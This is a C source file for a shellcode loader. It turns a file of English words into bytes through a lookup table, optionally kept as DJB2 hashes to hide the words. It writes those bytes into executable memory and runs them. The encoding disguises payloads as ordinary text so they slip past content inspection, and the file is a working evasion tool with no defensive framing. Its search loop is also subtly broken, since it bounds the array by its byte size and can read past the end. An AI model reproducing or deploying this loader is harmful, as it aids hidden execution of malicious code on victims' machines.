#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>

// Lookup table for converting English words to byte values
#ifdef DJB2
const unsigned long LOOKUP_TABLE[] = {
    0xb88ae26,  0x5978fa,   0xb885e18,  0x5979a8,   0x59783c,   0xb88738c,  0x597841,   0x597902,
    0x7c9e72d6, 0x597760,   0x7c9e73dd, 0x7ca01ea1, 0xb88c462,  0x597842,   0xb889596,  0x597906,
    0x59774c,   0xb885e9d,  0x7c96f1d9, 0x59773a,   0x597739,   0x7ca15114, 0xb885dde,  0x7c97c329,
    0xb88944f,  0x7c9abc18, 0x597734,   0xb88ba10,  0x597a01,   0x7ca01d9d, 0x7c97fd8e, 0xb8864f7,
    0x5979cd,   0xf11ede0,  0x597834,   0x7c9c2442, 0x5978cb,   0xb887a41,  0x1b7b12db, 0x7c96f087,
    0xb886350,  0xb889a9b,  0xb8899a7,  0x101903e7, 0x597798,   0x5978e2,   0x81e8dc6b, 0x7c9e7894,
    0x7c9e735f, 0x7c9ded1a, 0x597812,   0x5979ca,   0xb888f8c,  0x7ca017f9, 0x10a33758, 0x106cdda1,
    0x7c9b1ea2, 0xb889a9d,  0xb88b3d2,  0xb885e2d,  0x106cdebd, 0xb88a982,  0x7c9bcfe7, 0x597987,
    0xb887b49,  0x7ca01877, 0xd3798711, 0x7c97d3a9, 0x2f2fe831, 0xb88baf3,  0xb88ba83,  0x7c941af4,
    0xb889599,  0x7c97d2ee, 0xb887685,  0x597922,   0x7c9f9060, 0x12cf302a, 0xf704b8d,  0x597733,
    0x7c9487bf, 0x10a74230, 0xb887c13,  0x7ca00d58, 0x5978b7,   0xe7e8cc9,  0x7c9e05b9, 0x106cdede,
    0xf3b7ecb,  0xb8880f5,  0x7c9a154a, 0x8c135996, 0x7c9e72d0, 0x7c96cb66, 0x102a0798, 0x7c959163,
    0x7c947676, 0xb88af18,  0x14833eea, 0xb887a32,  0x7c9a1661, 0x7c9b0c46, 0x7c9930ab, 0x7c9bf101,
    0x10614a06, 0x7ca123f6, 0xb886943,  0x7c98869f, 0xf601aed,  0xb88b01f,  0x1d23c9b,  0x10a7356d,
    0x59795c,   0x7c9b1ec4, 0x7c9f2e76, 0x5977fb,   0x7ca037e8, 0x7c99f459, 0x7c9abc48, 0x2a2f8779,
    0xff58e86,  0xb886355,  0x7c95915f, 0x7c9a7fa3, 0x7c9e7353, 0x1bb91794, 0xc337be46, 0x1ceee48a,
    0x7c9c616b, 0xb887ac4,  0x7c95271e, 0xb885cce,  0x15366ff5, 0x10f9208e, 0x7c9e1df8, 0x14fc2fbf,
    0x23336146, 0x3ecc955e, 0xb13e83e2, 0xbe463eea, 0xf143297,  0x7c948993, 0xf42a7a30, 0x7c9e7354,
    0xb8882be,  0x7c97716e, 0x1091963c, 0x7ca00c99, 0x10a32840, 0x7c9884d1, 0x19716e36, 0x159d94a4,
    0xf2b2603,  0x7c97e345, 0x1b5aad4d, 0xe0096d26, 0x7c961b96, 0xfdccc86,  0xb88a9e5,  0x19314837,
    0x10c5a329, 0x1017da21, 0x7c9f810b, 0xc2d4b503, 0x7c94b390, 0xfac6527,  0xd3653e7c, 0x7c9d4d41,
    0xf8746f2,  0xb88a995,  0x7c9b1c41, 0x7c9a801a, 0x7c9f2e84, 0x7c9dc9a6, 0x59778e,   0x7c95cb10,
    0xb88a991,  0x10823ba3, 0xf006f223, 0x235a1c72, 0x723be1a7, 0xcda985df, 0x7c9a7f68, 0x7c96fe38,
    0xb888f83,  0x3f5a4f8a, 0xc339565d, 0x7c9a14a5, 0x7c999ec4, 0xf7de9f2,  0xb88ba16,  0x7c959216,
    0xb8137ec2, 0x7c9c25bc, 0xf3d581c,  0xf8719d8,  0x20ccac6e, 0xf97cd81,  0x7c9d4d49, 0x7c989e34,
    0xae7bc33d, 0xf62fb286, 0x7c961fa6, 0x7c9ad5ce, 0x10618552, 0x1ebb8b53, 0x3fd8f5cb, 0x7c9a7ebc,
    0x7c763c8,  0x192e1921, 0xb8898a0,  0xd826fdd,  0x982788b,  0x7c9a15ad, 0x106b7050, 0xf3d61338,
    0x2917e14,  0xb886a36,  0x7c9ddb4f, 0x10494163, 0x7c9ebd07, 0x6e5a925d, 0xfdfe6b0,  0x106d0968,
    0x10850feb, 0x3f2ab7f7, 0x123b2071, 0x4d5574a1, 0x410efc9b, 0xb8864fb,  0xf8876a7f, 0x7c9e564a,
    0x153a7594, 0x8c342dae, 0x1f2653eb, 0x3c19090a, 0x252258d8, 0x1c8a8b39, 0x7c94329e, 0x7c9ffbdf,
    0x1024a6bf, 0xb886be3,  0xe00633a7, 0x23638025, 0xb03db615, 0x6f99fd6f, 0xf73960e,  0xfce61027,
    0x7c9a2f35, 0xf2388e4,  0x7c953e80, 0x7c9de846, 0x7c967533, 0xf294442,  0xf393c43,  0xa4c66e86,
};

unsigned long djb2(const char *str) {
    unsigned long hash = 5381;
    int c;

    while ((c = *str++)) {
        hash = (((hash << 5) + hash) + c) & 0xFFFFFFFF;
    }
    return hash;
}
#else
const char *LOOKUP_TABLE[] = {"the",        "of",          "and",
                              "to",         "in",          "for",
                              "is",         "on",          "that",
                              "by",         "this",        "with",
                              "you",        "it",          "not",
                              "or",         "be",          "are",
                              "from",       "at",          "as",
                              "your",       "all",         "have",
                              "new",        "more",        "an",
                              "was",        "we",          "will",
                              "home",       "can",         "us",
                              "about",      "if",          "page",
                              "my",         "has",         "search",
                              "free",       "but",         "our",
                              "one",        "other",       "do",
                              "no",         "information", "time",
                              "they",       "site",        "he",
                              "up",         "may",         "what",
                              "which",      "their",       "news",
                              "out",        "use",         "any",
                              "there",      "see",         "only",
                              "so",         "his",         "when",
                              "contact",    "here",        "business",
                              "who",        "web",         "also",
                              "now",        "help",        "get",
                              "pm",         "view",        "online",
                              "first",      "am",          "been",
                              "would",      "how",         "were",
                              "me",         "services",    "some",
                              "these",      "click",       "its",
                              "like",       "service",     "than",
                              "find",       "price",       "date",
                              "back",       "top",         "people",
                              "had",        "list",        "name",
                              "just",       "over",        "state",
                              "year",       "day",         "into",
                              "email",      "two",         "health",
                              "world",      "re",          "next",
                              "used",       "go",          "work",
                              "last",       "most",        "products",
                              "music",      "buy",         "data",
                              "make",       "them",        "should",
                              "product",    "system",      "post",
                              "her",        "city",        "add",
                              "policy",     "number",      "such",
                              "please",     "available",   "copyright",
                              "support",    "message",     "after",
                              "best",       "software",    "then",
                              "jan",        "good",        "video",
                              "well",       "where",       "info",
                              "rights",     "public",      "books",
                              "high",       "school",      "through",
                              "each",       "links",       "she",
                              "review",     "years",       "order",
                              "very",       "privacy",     "book",
                              "items",      "company",     "read",
                              "group",      "sex",         "need",
                              "many",       "user",        "said",
                              "de",         "does",        "set",
                              "under",      "general",     "research",
                              "university", "january",     "mail",
                              "full",       "map",         "reviews",
                              "program",    "life",        "know",
                              "games",      "way",         "days",
                              "management", "part",        "could",
                              "great",      "united",      "hotel",
                              "real",       "item",        "international",
                              "center",     "ebay",        "must",
                              "store",      "travel",      "comments",
                              "made",       "development", "report",
                              "off",        "member",      "details",
                              "line",       "terms",       "before",
                              "hotels",     "did",         "send",
                              "right",      "type",        "because",
                              "local",      "those",       "using",
                              "results",    "office",      "education",
                              "national",   "car",         "design",
                              "take",       "posted",      "internet",
                              "address",    "community",   "within",
                              "states",     "area",        "want",
                              "phone",      "dvd",         "shipping",
                              "reserved",   "subject",     "between",
                              "forum",      "family",      "long",
                              "based",      "code",        "show",
                              "even",       "black",       "check",
                              "special"};
#endif

// Function to find the hex value for a word
uint8_t find_hex_value(const char *word) {
    for (int i = 0; i < sizeof(LOOKUP_TABLE); i++) {
#ifdef DJB2
        if (djb2(word) == LOOKUP_TABLE[i]) {
#else
        if (strcmp(word, LOOKUP_TABLE[i]) == 0) {
#endif
            return i;
        }
    }
    // Return 0x90 (NOP) if the word is not found
    // This also allows the use of undefined words for representing NOP
    printf("Word not found: %s\n", word);
    return 0x90;
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <filename>\n", argv[0]);
        return EXIT_FAILURE;
    }

    // Open the file
    int fd = open(argv[1], O_RDONLY);
    if (fd == -1) {
        perror("Failed to open file");
        return EXIT_FAILURE;
    }

    // Get the size of the file
    struct stat sb;
    if (fstat(fd, &sb) == -1) {
        perror("Failed to get file size");
        close(fd);
        return EXIT_FAILURE;
    }

    // Memory-map the file
    char *file_content = mmap(NULL, sb.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (file_content == MAP_FAILED) {
        perror("Failed to memory-map file");
        close(fd);
        return EXIT_FAILURE;
    }

    // File descriptor is no longer needed after mmap
    close(fd);

    // Allocate executable memory
    uint8_t *executable_memory = mmap(
        NULL, sb.st_size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0
    );
    if (executable_memory == MAP_FAILED) {
        perror("Failed to allocate executable memory");
        munmap(file_content, sb.st_size);
        return EXIT_FAILURE;
    }

    // Make a writable copy of the file contents
    char *writable_content = malloc(sb.st_size + 1);
    if (!writable_content) {
        perror("Failed to allocate memory for writable content");
        munmap(file_content, sb.st_size);
        munmap(executable_memory, sb.st_size);
        return EXIT_FAILURE;
    }
    memcpy(writable_content, file_content, sb.st_size);
    writable_content[sb.st_size] = '\0';  // Ensure null termination

    // Tokenize the input and write the corresponding hex values to executable memory
    char *token = strtok(writable_content, " ");
    size_t offset = 0;

    while (token != NULL && offset < sb.st_size) {
        uint8_t hex_value = find_hex_value(token);
#ifdef DEBUG
        printf("%s -> 0x%02x\n", token, hex_value);
#endif
        executable_memory[offset++] = hex_value;
        token = strtok(NULL, " ");
    }

    // Clean up
    free(writable_content);
    munmap(file_content, sb.st_size);

    // Cast executable memory to a function pointer and execute
    void (*shellcode)() = (void (*)())executable_memory;
    shellcode();

    // Clean up
    munmap(executable_memory, sb.st_size);

    return 0;
}
